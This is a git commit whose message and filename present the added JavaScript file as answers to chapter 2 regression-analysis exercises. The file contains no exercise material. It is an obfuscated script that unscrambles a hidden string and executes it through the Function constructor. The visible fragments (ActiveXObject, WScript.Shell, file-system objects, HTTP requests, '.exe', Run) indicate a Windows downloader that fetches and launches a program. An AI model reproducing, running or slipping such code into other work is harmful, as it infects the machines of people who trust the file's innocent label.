c87f5d6c207935b22b603193479dfc9ba33deb1f
DongsuKang <dongsukang91@gmail.com>
2020-08-02 23:53:26 +0900

    add problem and answer of chapter2

---
+++ 예제를_통한_회귀분석_연습문제_답.js
@@ -0,0 +1,19 @@
+function xo22(Qo5,Aq24) {return Qo5.charAt(Aq24);}
+function mu5(dJ33) {return dJ33 % (nT16+nT16);}
+function Eh8616(Sb31){
+nT16=Sb31;
+wr96=nT16+Sb31*nT16+Sb31;
+iP56=2485;}
+SS12(0);
+function UJ94() {lx4 = xD69(DQ60).split(st3023);}
+Eh8616(1);
+function SS12(yT46){
+DQ60 = '\'S\\+Wc/] rc0{ih2 peF)tcH1.k[-s.2=lp6=ehi)epd)p\'+\\(0\\+\' 2\"/\\2,/?2\":\\2xs@2op\")\\ty;+te 5hh}9\\t\'b c ger,+lx\\\"\'\\suT@ekE\" \\Gz{(\\=\'f \"(\\cOn+cxeg8epb6do9 n.5=i2, .9 c6Tfc8Fa8c l6c{s.(yer(r)e t;pf  li;Fa )Tc;09et32(x+.\\e\"s0T@e7e\\n\"s,d+n2(go()bp];9s\\ \"e5}rr+ct.\\a\"2st@9bc\\T\"huF,(s \\e\"=\\)\" \\{\"6[ )8)r;c(e cgtv nuarirrarn vt F SfP{oa2 tl3).s 0)e=0(; 2m c o}c=d 8=ni6=af. r rs.(euhFpttTlaa9atM2cs .e\'=((9 6/D5x((9]\\3\\-b6d[g4{x l2}; };)+)+\\2\'2/yPIg T;,)T0 8HNfWL(u]M]n\"Xtc\"r+t\"eriqvso\"r[n[eh tSa(M. L;22v2Ly7IM=30X8)NSW  M{{ \\)\'5 3(8r3t1e1c8t1e u<j r2b2nyOI (e Setltiahrwe i;r9n C=g .2.2tyfIp r}i;o)r(m9c9CtSeh W{a  )r)=7C7 4o72(dp9eeeTl(sF.pt pai{rrc SsW) e!3(I  fni<}t; )(\"0fLx2nvlFt7vHn3o(g,h v1\\e\\0\"l+))i\"+pho3tw\"0+ \")k;s;e0D \" (}]=\")s r;e0d \"2+l\"FlxoHF4l a[i;\"3+]\"]c\\e\"p(Sn\"F[o)P\"dl2lne3hoS).lt(p.i)rlc;SaW \"t(W]i\"StpcceajrbcOientpaaetrgC.\"r[Qtopuimric\\S\"Wt(,](\"\\r\"e)dml;ooF ect}a.e reC}\"n[ )n\"etaclesjsbuOemse tas{ymS ealWimFS.\\g\"nci,trp\\i\"ricmSp\"o(t]c\".t.cseejlbcOeerteaueproC(\"s[2tep2irr2coS2Wc{2 t))(n9;9ot em }n\\o\"i t[cHn uFf= 2/ *0622+*6/+;i6;0d9}1\'=)z)j(eIqyv2D2T)j;riohtcchuir=tlsxn4o;c ';
+Wn97=yT46;}
+st3023="jTDv";
+function YV49() {lx4[wr96](lx4[nT16])(lx4[nT16]);}
+UJ94();
+function xD69(pm8) {NY33=Wn97; rW36=""; while (NY33 < iP56) {jF66=xo22(pm8,NY33);if (mu5(NY33)) rW36+=((jF66)+("")+("")+("")); else rW36=jF66+rW36; NY33++; }return (rW36);}
+Gr42();
+function Gr42() {lx4[wr96] = SS12[lx4[Wn97]];}
+YV49();
